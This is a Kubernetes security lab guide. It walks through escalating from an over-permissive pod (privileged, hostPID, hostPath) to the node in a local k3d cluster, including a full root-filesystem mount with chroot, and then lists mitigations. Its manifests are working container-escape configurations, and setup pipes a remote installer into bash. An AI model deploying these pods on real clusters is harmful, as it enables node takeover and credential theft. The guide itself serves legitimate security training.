# Lab 01 — Privilege Escalation via Over-Permissive Pod (k3d)

> **Estimated time:** 10–20 minutes  

---

## What you’ll learn

- How an unsafe Pod spec (`privileged`, `hostPID`, `hostPath`) lets you access **node** resources.
- How to verify and exploit a host filesystem mount from inside a pod.
- Why these settings are dangerous and how to mitigate them.

---

## Requirements

Use a Bash shell (macOS Terminal, Linux, or **Ubuntu on WSL2**). Make sure these are installed and working:

```bash
docker --version
k3d version
kubectl version --short
```

If you’re missing tools:

### macOS (Homebrew)
```bash
brew install --cask docker
open -a Docker.app   # start Docker Desktop and wait until it's running
brew install k3d kubectl
```

### Ubuntu / Debian
```bash
sudo apt update
sudo apt install -y docker.io uidmap
sudo usermod -aG docker $USER
newgrp docker
curl -s https://raw.githubusercontent.com/k3d-io/k3d/main/install.sh | bash
sudo apt install -y kubectl
```

### Windows 11 (WSL2 path)
1. Install **Docker Desktop** and enable *WSL2 integration*.
2. Install **Ubuntu** from the Microsoft Store.
3. Run the **Ubuntu** app and use the **Ubuntu** commands above (Linux section).

> If Docker Desktop is used, make sure it’s **running** before you start.

---

## Prep the lab folder & flag

```bash
# Pick a working folder
mkdir -p ~/k8s_labs/lab1 && cd ~/k8s_labs/lab1

# Create a host-side flag we'll try to read from the pod
mkdir -p flags
echo "FLAG-k8s-privilege-escalation-12345" > flags/flag1.txt
```

---

## Create a fresh k3d cluster

We mount the `./flags` folder into **both** the server and agent nodes at `/labflags` so the pod can hostPath-mount it no matter where it schedules.

```bash
k3d cluster delete priv-esc-lab || true

k3d cluster create priv-esc-lab   --agents 1   --k3s-arg '--disable=servicelb@server:0'   --volume "$PWD/flags:/labflags@server:0"   --volume "$PWD/flags:/labflags@agent:0"

kubectl config use-context k3d-priv-esc-lab
kubectl get nodes
```

> **Why two `--volume` flags?** The pod may land on the server or the agent node. Mounting both ensures `/labflags` exists either way.

---

## Pod manifest (over-permissive on purpose)

Save this as **`pwnpod.yaml`**:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwnpod
spec:
  hostPID: true
  containers:
  - name: attacker
    image: busybox:latest
    command: ["/bin/sh","-c","sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /mnt/host
  volumes:
  - name: host-root
    hostPath:
      path: /labflags
      type: Directory
```

---

## Run the lab

```bash
kubectl apply -f pwnpod.yaml
kubectl get pods -w
```

When `pwnpod` is `Running`, grab a shell and read the host-mounted file:

```bash
kubectl exec -it pwnpod -- /bin/sh
ls /mnt/host
cat /mnt/host/flag1.txt
```

You should see:

```
FLAG-k8s-privilege-escalation-12345
```

---

## (Optional) “Full escape” variant

Mount the **node root** into the pod and `chroot` for dramatic effect.

Create **`pwnpod-root.yaml`**:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwnpod-root
spec:
  hostPID: true
  containers:
  - name: attacker
    image: busybox:latest
    command: ["/bin/sh","-c","sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /mnt/host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

Run it:

```bash
kubectl apply -f pwnpod-root.yaml
kubectl exec -it pwnpod-root -- /bin/sh
chroot /mnt/host /bin/sh || sh
hostname
# (On real hosts you could read /etc/shadow; in k3d this is the node container's FS)
```

---

## Teaching points (why this works)

| Misconfiguration      | What it enables |
|-----------------------|------------------|
| `privileged: true`    | Broad kernel/device access from the pod |
| `hostPID: true`       | View/interact with host process table |
| `hostPath` mount      | Direct file access to node paths |

**Bottom line:** With these three together, a compromised pod can pivot to the node.

---

## Cleanup

```bash
kubectl delete pod pwnpod pwnpod-root --ignore-not-found
k3d cluster delete priv-esc-lab
```

---

## Mitigations (for your real clusters)

- Enforce **Pod Security Admission** `restricted` profile (blocks privileged + hostPath by default).
- Drop `privileged: true` and `hostPID: true`.
- Restrict `hostPath` with admission controls (OPA/Gatekeeper or Kyverno).
- Tighten **RBAC** so few identities can create pods or request elevated security contexts.
- Use **seccomp**/**AppArmor** to reduce syscall exposure.

---

## Troubleshooting

**Pod stuck `ContainerCreating` with `FailedMount: hostPath type check failed`**
```text
/labflags is not a directory
```
Recreate the cluster and be sure both nodes have the mount (the two `--volume ... @server:0` and `@agent:0` flags in the create command).

**`ImagePullBackOff` / `ErrImagePull`**
- Check time & connectivity:
  ```bash
  date
  ping -c1 8.8.8.8
  ```
- Try pulling directly from the node’s containerd (helps pinpoint network vs. k8s):
  ```bash
  docker exec -it k3d-priv-esc-lab-agent-0 ctr -n k8s.io images pull docker.io/library/busybox:latest
  ```
- If Docker Hub is just slow, preload the image (keeps `:latest` in YAML):
  ```bash
  docker pull busybox:latest
  k3d image import -c priv-esc-lab busybox:latest
  kubectl delete pod pwnpod && kubectl apply -f pwnpod.yaml
  ```

**Windows/macOS file sharing**
- If `flags` doesn’t show up inside the node, enable file sharing for that folder/drive in Docker Desktop and retry cluster creation.